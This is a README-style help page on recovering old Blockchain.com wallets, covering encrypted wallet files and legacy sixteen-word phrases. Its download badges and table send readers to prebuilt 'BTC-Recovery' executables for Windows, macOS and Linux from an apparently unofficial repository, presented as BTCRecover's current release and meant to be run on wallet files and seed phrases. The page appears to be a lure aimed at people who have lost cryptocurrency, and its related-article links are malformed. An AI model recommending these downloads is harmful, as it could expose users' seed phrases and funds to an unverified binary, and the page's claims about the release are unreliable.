<div align="center">
<img src="assets/banner-article.png" alt="Blockchain.com wallet recovery">
</div>

# Blockchain.com wallet recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

Blockchain.com produced two very different artifacts over the years: an encrypted wallet file downloaded from an account, and a legacy recovery phrase of its own design  -  usually sixteen words, occasionally twelve. The file needs a password search; the phrase needs its own format, not a standard BIP39 restore.

## You'll see this if

The artifact is old and the labels are gone. Two questions sort it: is it a file or words, and how many words.

| What you have | What it is | Where to go |
|---|---|---|
| A downloaded `wallet.aes.json` or similar file | the encrypted account wallet | here  -  password search |
| Sixteen words on paper | the legacy Blockchain.com phrase, not BIP39 | here  -  format first |
| Twelve words and an old account | usually the legacy phrase, sometimes standard | here |
| A phrase that a modern wallet rejects | expected: the word list is not the standard one | [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) |
| A file that opens but shows nothing | wrong password attempt, or the wrong file | [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md) |
| Nothing but a username and password for the site | an account login, not a wallet artifact | the provider's own account recovery |

## Why it happens

Blockchain.com's wallet service encrypted each account's wallet with the user's password and let them download the encrypted file as a backup. That file is self-contained: with the password it decrypts locally, and without it the only route is a candidate search.

The phrase is a separate design from a later era. It used its own word list and its own word count, so it does not satisfy a standard checksum and a modern wallet will reject it outright. That rejection is the most misread signal in this whole area: people conclude the phrase is damaged and start substituting words, when the actual problem is that they are testing a legacy phrase against a standard validator.

Both artifacts share one property worth stating plainly: neither is held by anybody else. The service cannot reissue a phrase or reset a wallet password, and no support route replaces the file or the words. Whatever survived on your disk or paper is the whole recovery.

The downloaded file is a small JSON container. The encryption sits around the key material while the structure, the address list and the parameters that tune the password derivation remain visible, which is why a copy can be identified and checked without the password at all. Two consequences follow, and both save time. An old file can be confirmed as the right account before a search begins, simply by comparing addresses; and a truncated or corrupted file can often be recognised as damaged rather than as a wrong password, which stops a pointless run before it starts.

## Fix

Identify which artifact you hold, and do not mix the two routes.

1. **Establish the artifact.** A downloaded file is an encrypted wallet; a written phrase is a legacy seed. Recovering one tells you nothing about the other.
2. **For a file: copy it, then search the password** against the copy with candidate rules built from what you remember: [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md).
3. **For a phrase: count the words and stop.** Sixteen words means the legacy format. Twelve could be either, and the test is whether a standard wallet accepts it: [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md).
4. **Restore a legacy phrase in a wallet that understands it** rather than in one that validates against the standard list. Format comes before vocabulary.
5. **Download the current release from the GitHub releases page** and run the tool offline, selecting the wallet type rather than letting it guess: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Confirm with an address from the account**  -  a receive address from a statement, an email or a screenshot  -  before moving anything: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
7. **Retire the artifact.** Once access is restored, move the balance to a wallet whose backup you have tested and whose format you understand.

The account and the wallet are different objects even when they share a name. An account login opens a service that holds a balance; a wallet file, or a phrase, controls keys. People arrive here carrying one and looking for the other, so the first minute is well spent deciding which you have  -  and if the answer is an account, the provider's own process is the only route, because no key-based tool can reach a balance that lives in someone else's database.

## If that did not work

If a file will not decrypt after a serious candidate search, the file may not be the one that belongs to the account  -  downloads were often renamed, and an old copy can sit beside a newer one.

If a phrase is rejected in every wallet you try, the word list is the explanation far more often than the words. Legacy phrases came from a list that standard tools do not validate against, so a phrase can be perfect and unusable in the wrong application. Where the words are genuinely uncertain  -  one word illegible, a smudge, a line lost  -  the phrase becomes a partial-phrase search, and the target address matters more than ever: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md).

A useful check before giving up on a file: try the password you believe is correct with and without trailing spaces and case variations. Encrypted wallet files fail closed on the smallest difference, and that single character is the most common cause of a run that should have worked.

## Prevention

- Label every downloaded backup with the account, the year and the wallet type.
- Write a legacy phrase down exactly, including word count, and store the format note with it.
- Keep two copies of the file; a corrupt download cannot be recovered at all.
- Move long-term balances to a wallet with a format you can restore anywhere.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### How do I recover my Blockchain.com wallet?

If you have the downloaded encrypted file, search the password locally against a copy of it. If you have the legacy phrase, restore it in a wallet that understands that format  -  a standard validator will reject it even when the words are right.

### Is a Blockchain.com phrase a BIP39 seed?

Not in the legacy format: it used its own word list and count, usually sixteen words. A phrase that fails a standard checksum may still be a perfectly valid phrase for its own wallet type.

### Can I recover an old Blockchain.com wallet without the phrase?

Only with the encrypted file and its password. Without either, nothing remains to search, and the account cannot be reopened by anyone else: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md).

### My sixteen-word phrase is not accepted. What now?

Check the format before the words. Sixteen words is the signature of the legacy scheme, and the fix is a wallet or tool that supports it, not a substitution in the phrase.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Invalid recovery phrase]([Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [wallet.dat password recovery for Bitcoin Core]([wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md))
- [You forgot which wallet software you used]([You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md))
